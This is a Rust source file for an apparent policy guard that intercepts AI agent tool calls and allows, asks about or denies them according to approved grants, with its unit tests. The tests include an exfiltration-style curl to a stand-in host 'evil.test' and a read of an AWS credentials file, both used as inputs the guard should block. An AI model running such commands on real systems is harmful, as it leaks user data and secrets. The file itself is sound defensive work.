//! Deciding an intercepted tool call against the reviewed policy set.
//!
//! A `PreToolUse` hook does not tell the guard which skill triggered a call, so
//! enforcement is against the **union** of every approved policy's grants. A
//! call whose every effect is covered by some approved grant proceeds; a call
//! with an uncovered effect is refused or surfaced, per mode.
//!
//! The intercepted call is normalized into the same effect vocabulary the
//! analysis uses - that shared vocabulary is the whole reason an enumerated
//! grant and a runtime call can be compared at all.

use crate::effect::{EffectClass, Reach};
use crate::extract::shell;
use crate::normalize::{path, url};
use serde::Serialize;

/// The guard's operating mode.
#[derive(Clone, Copy, Debug, Eq, PartialEq, Serialize, serde::Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Mode {
    /// Allow everything, record every call. Nothing is blocked.
    Observe,
    /// Surface an uncovered call for approval.
    Prompt,
    /// Refuse an uncovered call.
    Enforce,
}

impl Mode {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Observe => "observe",
            Self::Prompt => "prompt",
            Self::Enforce => "enforce",
        }
    }

    pub fn parse(value: &str) -> Option<Self> {
        match value.trim().to_ascii_lowercase().as_str() {
            "observe" => Some(Self::Observe),
            "prompt" => Some(Self::Prompt),
            "enforce" => Some(Self::Enforce),
            _ => None,
        }
    }
}

/// What the guard decided about a call. Maps to a harness permission decision.
#[derive(Clone, Copy, Debug, Eq, PartialEq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Decision {
    /// Let normal permission flow proceed. Used when covered, and in observe.
    Defer,
    /// Refuse the call.
    Deny,
    /// Escalate to the user.
    Ask,
}

impl Decision {
    /// The `permissionDecision` string for a Claude Code `PreToolUse` hook.
    pub fn permission_decision(self) -> &'static str {
        match self {
            Self::Defer => "defer",
            Self::Deny => "deny",
            Self::Ask => "ask",
        }
    }
}

/// The result of evaluating one intercepted call.
#[derive(Clone, Debug, Serialize)]
pub struct GuardDecision {
    pub decision: Decision,
    pub tool: String,
    /// Grant labels the call needs.
    pub effects: Vec<String>,
    /// The effects not covered by any approved grant.
    pub uncovered: Vec<String>,
    pub reason: String,
}

/// Evaluate an intercepted tool call against the union allow-set.
pub fn evaluate(
    tool: &str,
    tool_input: &serde_json::Value,
    allow: &[String],
    mode: Mode,
) -> GuardDecision {
    let effects = call_grants(tool, tool_input);
    let uncovered = effects
        .iter()
        .filter(|grant| !allow.iter().any(|allowed| allowed == *grant))
        .cloned()
        .collect::<Vec<_>>();

    let decision = match mode {
        // Observe never blocks; it only records. Defer, so the user's own
        // permission rules still apply unchanged.
        Mode::Observe => Decision::Defer,
        _ if uncovered.is_empty() => Decision::Defer,
        Mode::Prompt => Decision::Ask,
        Mode::Enforce => Decision::Deny,
    };

    let reason = match decision {
        Decision::Defer if uncovered.is_empty() => {
            "every effect of this call is covered by an approved grant".to_owned()
        }
        Decision::Defer => "observe mode records but does not block".to_owned(),
        Decision::Deny => format!("no approved grant covers: {}", uncovered.join(", ")),
        Decision::Ask => format!("approval needed for: {}", uncovered.join(", ")),
    };

    GuardDecision {
        decision,
        tool: tool.to_owned(),
        effects,
        uncovered,
        reason,
    }
}

/// Normalize an intercepted tool call into the grant labels it needs.
///
/// A call that cannot be normalized into any effect yields an empty set, which
/// is treated as covered - the guard governs the effects it understands and
/// does not block calls it cannot model, consistent with the deny-default
/// applying to *enumerated* effects rather than to unrecognized tools.
fn call_grants(tool: &str, input: &serde_json::Value) -> Vec<String> {
    let mut grants = Vec::new();
    match tool {
        "Bash" => {
            if let Some(command) = input.get("command").and_then(|v| v.as_str()) {
                grants.extend(effects_from_shell(command));
            }
        }
        "Read" | "NotebookRead" => {
            if let Some(target) = file_grant(input, EffectClass::FsRead) {
                grants.push(target);
            }
        }
        "Write" | "Edit" | "NotebookEdit" => {
            if let Some(target) = file_grant(input, EffectClass::FsWrite) {
                grants.push(target);
            }
        }
        "WebFetch" => {
            if let Some(host) = input
                .get("url")
                .and_then(|v| v.as_str())
                .and_then(url::normalize)
            {
                grants.push(format!("{}:{}", EffectClass::NetFetch, host.host));
            }
        }
        _ => {
            // Any other tool, including MCP tools, is a tool invocation.
            grants.push(format!("{}:{}", EffectClass::ToolInvoke, tool));
        }
    }
    grants.sort();
    grants.dedup();
    grants
}

fn effects_from_shell(command: &str) -> Vec<String> {
    let observations = shell::extract(
        command,
        shell::ShellContext {
            path: "<intercepted>",
            origin: crate::effect::EffectOrigin::ScriptFile,
            reach: Reach::Activation,
            first_line: 1,
        },
    );
    // Only grantable effects need a matching grant; a dynamic target could not
    // have been granted and is treated as uncovered by giving it its label.
    observations
        .into_iter()
        .map(|obs| format!("{}:{}", obs.class, obs.target.grant_token()))
        .collect()
}

fn file_grant(input: &serde_json::Value, class: EffectClass) -> Option<String> {
    let raw = input
        .get("file_path")
        .or_else(|| input.get("path"))
        .or_else(|| input.get("notebook_path"))
        .and_then(|v| v.as_str())?;
    let normalized = path::normalize(raw);
    Some(format!("{class}:{}", normalized.class.as_str()))
}

#[cfg(test)]
mod tests {
    use super::{evaluate, Decision, Mode};
    use serde_json::json;

    fn bash(command: &str) -> serde_json::Value {
        json!({ "command": command })
    }

    #[test]
    fn a_covered_call_defers_in_every_mode() {
        let allow = vec!["proc.exec:git".to_owned()];
        for mode in [Mode::Observe, Mode::Prompt, Mode::Enforce] {
            let decision = evaluate("Bash", &bash("git status"), &allow, mode);
            assert_eq!(decision.decision, Decision::Defer, "{mode:?}");
            assert!(decision.uncovered.is_empty());
        }
    }

    #[test]
    fn an_uncovered_call_is_denied_in_enforce_and_asked_in_prompt() {
        let allow = vec!["proc.exec:git".to_owned()];
        let input = bash("curl -d @- https://evil.test");
        assert_eq!(
            evaluate("Bash", &input, &allow, Mode::Enforce).decision,
            Decision::Deny
        );
        assert_eq!(
            evaluate("Bash", &input, &allow, Mode::Prompt).decision,
            Decision::Ask
        );
    }

    #[test]
    fn observe_never_blocks_even_an_uncovered_call() {
        let allow = Vec::new();
        let decision = evaluate(
            "Bash",
            &bash("curl https://evil.test"),
            &allow,
            Mode::Observe,
        );
        assert_eq!(decision.decision, Decision::Defer);
        // ...but it still records what was uncovered.
        assert!(!decision.uncovered.is_empty());
    }

    #[test]
    fn the_denial_reason_names_the_uncovered_grant() {
        let decision = evaluate("Bash", &bash("curl https://evil.test"), &[], Mode::Enforce);
        assert!(decision.reason.contains("net.fetch:evil.test"));
    }

    #[test]
    fn a_file_read_maps_to_its_path_class() {
        let input = json!({ "file_path": "/root/.aws/credentials" });
        let decision = evaluate("Read", &input, &[], Mode::Enforce);
        assert!(decision.effects.contains(&"fs.read:secret".to_owned()));
        assert_eq!(decision.decision, Decision::Deny);
    }

    #[test]
    fn a_web_fetch_maps_to_its_host() {
        let input = json!({ "url": "https://api.github.com/user" });
        let decision = evaluate(
            "WebFetch",
            &input,
            &["net.fetch:api.github.com".to_owned()],
            Mode::Enforce,
        );
        assert_eq!(decision.decision, Decision::Defer);
    }

    #[test]
    fn an_agent_driven_skill_install_fails_closed() {
        // A skill installs from a git repo through the harness CLI. No ordinary
        // policy grants `pkg.install:skill/...`, so it is denied in enforce -
        // the boundary gate assesses the repo before it can land.
        let input = bash("claude plugin install rote-onboard@rote-skills");
        let decision = evaluate("Bash", &input, &[], Mode::Enforce);
        assert!(decision
            .effects
            .iter()
            .any(|grant| grant.starts_with("pkg.install:skill/")));
        assert_eq!(decision.decision, Decision::Deny);
    }

    #[test]
    fn an_unknown_tool_is_a_tool_invocation() {
        let decision = evaluate("mcp__memory__store", &json!({}), &[], Mode::Enforce);
        assert!(decision
            .effects
            .contains(&"tool.invoke:mcp__memory__store".to_owned()));
    }
}
